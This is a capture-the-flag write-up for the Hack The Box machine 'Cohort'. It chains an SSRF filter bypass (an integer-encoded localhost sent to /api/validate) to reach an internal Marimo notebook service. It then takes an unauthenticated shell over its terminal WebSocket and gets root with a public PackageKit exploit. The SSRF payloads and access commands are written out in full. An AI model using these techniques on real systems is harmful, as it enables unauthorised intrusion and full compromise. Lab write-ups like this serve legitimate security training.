# Hack The Box — Cohort

Difficulty: Medium

OS: Linux

Target IP: 10.129.39.56

## 1. Reconnaissance

### Port Scan

First, I performed a port scan using `rustscan`.

```bash
rustscan -a 10.129.39.56 -- -sV -sC -oN nmap
```

Main results:

```text
PORT     STATE SERVICE        REASON         VERSION
22/tcp   open   ssh            syn-ack ttl 63 OpenSSH 10.0p2 Ubuntu 5ubuntu5.4
80/tcp   open   http           syn-ack ttl 63 nginx 1.28.0 (Ubuntu)
1515/tcp open   ifor-protocol? syn-ack ttl 63
```

nginx was running on port 80, making the HTTP application the main target for further investigation.

## 2. Web Enumeration

### Directory Enumeration

I used `feroxbuster` to enumerate web content.

```bash
feroxbuster -u https://cohort.htb --insecure
```

The following interesting endpoints were identified:

```text
https://cohort.htb/api/
https://cohort.htb/status
https://cohort.htb/api/health
```

## 3. SSRF

### SSRF Discovery

I accessed `https://cohort.htb/portal.html` and inspected the browser traffic.

<img width="2557" height="1277" alt="Pasted image 20260909134353" src="https://github.com/user-attachments/assets/745e2b34-7641-4c9c-ba1b-be69e0a13911" />

<img width="917" height="362" alt="image" src="https://github.com/user-attachments/assets/be3dca3d-800e-4fd3-9e41-0d5e8867ff2d" />

Among the requests, I discovered a POST request to `/api/validate`.

```http
POST /api/validate HTTP/1.1
Host: cohort.htb
Content-Type: application/json

{"url":"http://2130706433:80","format":"csv"}
```

Here, `2130706433` is used instead of the normal `127.0.0.1`.

`2130706433` is the 32-bit integer representation of `127.0.0.1`, and some HTTP clients interpret it as localhost.

In this application, input such as `127.0.0.1` was filtered, so this representation was used to test for SSRF.

The following response was returned:

```bash
curl -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://2130706433","format":"csv"}' \
  -k

Response:

{
  "ok": true,
  "fetched_status": 200,
  "content_type": "text/html",
  "preview": "<!doctype html>\n<html lang=\"en\">\n<head>\n...",
  "message": "Source reachable."
}
```

This result showed that the server itself was sending an HTTP request to the specified URL.

In other words, it was possible that internal services that could not be accessed directly from the outside could also be reached through `/api/validate`.

### Confirming SSRF

Next, I specified an internal endpoint that was restricted from normal external access and checked its behavior.

```bash
curl -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://2130706433:80/status","format":"csv"}' \
  -k
```

The `/status` endpoint returned information about the internal architecture.

```json
{
  "service": "cohort-edge",
  "status": "ok",
  "generated_by": "nginx",
  "upstreams": [
    {
      "name": "marketing",
      "host": "cohort.htb",
      "root": "/var/www/cohort"
    },
    {
      "name": "insights-api",
      "host": "cohort.htb",
      "path": "/api/",
      "target": "127.0.0.1:5000"
    },
    {
      "name": "notebooks",
      "host": "nb-1be3782a8afd3ad5.cohort.htb",
      "target": "127.0.0.1:8888",
      "note": "internal analyst workspace, not for external use"
    }
  ]
}
```

From this, the following internal services were identified:

```text
127.0.0.1:5000  → insights-api
127.0.0.1:8888  → notebooks
```

In particular, the `notebooks` service was described as:

```text
internal analyst workspace, not for external use
```

indicating that it was an internal service that was not intended to be publicly accessible.

The following hostname was also disclosed:

```text
nb-1be3782a8afd3ad5.cohort.htb
```

This subdomain corresponds to the internal notebook service running on `127.0.0.1:8888`.

I therefore added this hostname to `/etc/hosts` and continued the investigation.

## 4. Internal Service Enumeration

### Port 8888

Using SSRF, I directly accessed the internal service on port 8888.

```bash
curl -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://2130706433:8888","format":"csv"}' \
  -k
```

The response contained the `marimo` login page.

```text
<title>marimo</title>
```

It also contained an input form for:

```text
Access Token / Password
```

At this point, it was clear that Marimo was being used as the internal notebook service.

### Port 5000

I also tested port 5000 using SSRF.

```bash
curl -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://2130706433:5000","format":"csv"}' \
  -k
```

Response:

```json
{
  "ok": false,
  "message": "Method not allowed."
}
```

The service itself was confirmed to be present, but for this attack path, I prioritized the Marimo service on port 8888.

## 5. Marimo Discovery

### Marimo Version

I investigated several API endpoints on the internal host.

```bash
curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/api/version -H "Authorization: Bearer any-value"
curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/api/v1/version -H "Authorization: Bearer any-value"
curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/version -H "Authorization: Bearer any-value"
curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/api/status -H "Authorization: Bearer any-value"
curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/health -H "Authorization: Bearer any-value"
curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/healthz -H "Authorization: Bearer any-value"
```

The `/api/version` response revealed that the Marimo version was `0.20.4`.

The other endpoints were not functional.

## 6. Initial Access — Marimo

Marimo `0.20.4` was affected by CVE-2026-39987.

This vulnerability allows an unauthenticated attacker to access a terminal through Marimo's `/terminal/ws` WebSocket endpoint.

In this environment, Marimo was running as an internal service, so I accessed it through the subdomain discovered earlier.

### WebSocket Access

I prepared `websocat`.

```bash
sudo wget -O /usr/local/bin/websocat \
  https://github.com/vi/websocat/releases/latest/download/websocat.x86_64-unknown-linux-musl

sudo chmod +x /usr/local/bin/websocat

websocat --version
```

I then connected to Marimo's `/terminal/ws`.

```bash
websocat "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws" -k
```

After connecting, I obtained a shell on Marimo.

<img width="862" height="132" alt="image" src="https://github.com/user-attachments/assets/55301ce6-6277-409c-9d6e-34dd25e4a19a" />

This provided initial access as the `marimo` user.

## 7. Privilege Escalation

### LinPEAS

From the `marimo` shell, I ran LinPEAS to investigate the local environment.

LinPEAS identified the following information regarding PackageKit:

<img width="1055" height="77" alt="Pasted image 20260909132406" src="https://github.com/user-attachments/assets/32077b9b-a026-4796-9a63-d654bfbac70a" />

This indicated that PackageKit was a strong candidate for privilege escalation.

### CVE-2026-41651 — Pack2TheRoot

CVE-2026-41651 is a vulnerability that allows local privilege escalation by exploiting the affected PackageKit version.

I used a publicly available PoC.

```text
https://github.com/Vozec/CVE-2026-41651
```

Executing the PoC on the target resulted in a root shell.

I confirmed that a root shell had been obtained.

<img width="722" height="455" alt="image" src="https://github.com/user-attachments/assets/6e7edae6-82bf-4f63-92b1-03db62b04b0d" />

### User Flag

```bash
cat /home/marimo/user.txt
```

### Root Flag

```bash
cat /root/root.txt
```
